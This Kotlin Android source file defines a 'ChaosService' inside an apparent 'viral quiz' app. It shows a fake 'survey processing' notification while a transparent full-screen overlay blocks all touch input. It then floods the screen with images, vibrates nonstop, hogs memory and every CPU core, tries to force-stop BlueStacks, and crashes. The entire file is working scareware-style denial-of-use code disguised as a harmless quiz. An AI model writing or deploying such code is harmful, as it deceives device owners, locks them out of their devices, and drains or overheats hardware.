package com.example.viralquiz

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.media.MediaPlayer
import android.os.*
import android.view.*
import android.widget.ImageView
import androidx.core.app.NotificationCompat
import kotlin.random.Random

class ChaosService : Service() {
    private lateinit var windowManager: WindowManager
    private val overlays = mutableListOf<View>()
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = true
    private var mediaPlayer: MediaPlayer? = null
    
    // Ресурсы картинок (добавь свои в drawable)
    private val rainbowImages = arrayOf(
        R.drawable.rainbow1,
        R.drawable.rainbow2,
        R.drawable.rainbow3
    )

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        // Фореграунд нотификация (требуется для Android 8+)
        createNotificationChannel()
        startForeground(1, createNotification())
        
        // Запускаем полный хаос
        startFullChaos()
    }

    private fun startFullChaos() {
        // 1. Блокируем всё
        blockAllInput()
        
        // 2. Запускаем звук хаоса
        playChaosSound()
        
        // 3. Радужную вечеринку
        startRainbowParty()
        
        // 4. Вибрацию
        startMadVibration()
        
        // 5. Жрем память
        memoryBomb()
        
        // 6. Греем процессор
        cpuBomb()
        
        // 7. Через 15 секунд "крашим"
        handler.postDelayed({
            crashEverything()
        }, 15000)
    }

    private fun blockAllInput() {
        // Overlay на весь экран который перехватывает все тапы
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSPARENT
        )
        
        val blocker = View(this).apply {
            setOnTouchListener { _, _ -> true }
            setBackgroundColor(0x00000000)
        }
        
        try {
            windowManager.addView(blocker, params)
            overlays.add(blocker)
        } catch (e: Exception) {}
    }

    private fun playChaosSound() {
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.chaos_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.start()
        } catch (e: Exception) {}
    }

    private fun startRainbowParty() {
        // Каждые 50мс новая картинка
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!isRunning) return
                
                createRandomImageOverlay()
                
                // Ускоряемся
                val delay = maxOf(20L, 50 - overlays.size.toLong())
                handler.postDelayed(this, delay)
            }
        }, 50)
    }

    private fun createRandomImageOverlay() {
        val size = Random.nextInt(150, 500)
        
        val params = WindowManager.LayoutParams(
            size,
            size,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        ).apply {
            x = Random.nextInt(-400, 400)
            y = Random.nextInt(-800, 800)
            gravity = Gravity.CENTER
        }

        val imageView = ImageView(this).apply {
            setImageResource(rainbowImages.random())
            alpha = 0.6f + Random.nextFloat() * 0.4f
            rotation = Random.nextFloat() * 360f
            
            // Анимация
            animate()
                .rotationBy(Random.nextFloat() * 720 - 360)
                .scaleX(0.5f + Random.nextFloat())
                .scaleY(0.5f + Random.nextFloat())
                .setDuration(500)
                .start()
        }

        try {
            windowManager.addView(imageView, params)
            overlays.add(imageView)
            
            // Удаляем старые чтобы не было OOM слишком быстро
            if (overlays.size > 100) {
                val old = overlays.removeAt(0)
                windowManager.removeView(old)
            }
        } catch (e: Exception) {}
    }

    private fun startMadVibration() {
        val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        Thread {
            while (isRunning) {
                vibrator.vibrate(2000)
                Thread.sleep(100)
            }
        }.start()
    }

    private fun memoryBomb() {
        val memoryHog = mutableListOf<ByteArray>()
        
        Thread {
            while (isRunning) {
                try {
                    // По 50MB за раз
                    repeat(50) {
                        memoryHog.add(ByteArray(1024 * 1024))
                    }
                    Thread.sleep(50)
                } catch (e: OutOfMemoryError) {
                    System.gc()
                    Thread.sleep(100)
                }
            }
        }.start()
    }

    private fun cpuBomb() {
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores * 4) { // x4 потоки на ядро
            Thread {
                while (isRunning) {
                    var x = 0.0
                    // Тяжелые вычисления
                    for (i in 0..10_000_000) {
                        x += Math.sin(i.toDouble()) * Math.cos(i.toDouble()) * Math.tan(i.toDouble() + 1)
                    }
                }
            }.start()
        }
    }

    private fun crashEverything() {
        // Проигрываем звук краша
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer.create(this, R.raw.crash_sound)
            mediaPlayer?.start()
        } catch (e: Exception) {}
        
        // Финальный всплеск - создаем тысячи окон
        repeat(50) {
            createRandomImageOverlay()
        }
        
        // Пытаемся убить процесс BlueStacks через Runtime
        try {
            Runtime.getRuntime().exec("am force-stop com.bluestacks.appplayer")
        } catch (e: Exception) {}
        
        // Форсируем краш этого приложения
        handler.postDelayed({
            throw OutOfMemoryError("SYSTEM CRASH INITIATED")
        }, 2000)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "chaos_channel",
                "Chaos Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "chaos_channel")
            .setContentTitle("Опрос работает...")
            .setContentText("Обработка результатов")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onDestroy() {
        isRunning = false
        mediaPlayer?.release()
        
        // Пытаемся убрать оверлеи
        overlays.forEach {
            try { windowManager.removeView(it) } catch(e: Exception) {}
        }
        overlays.clear()
        
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null
}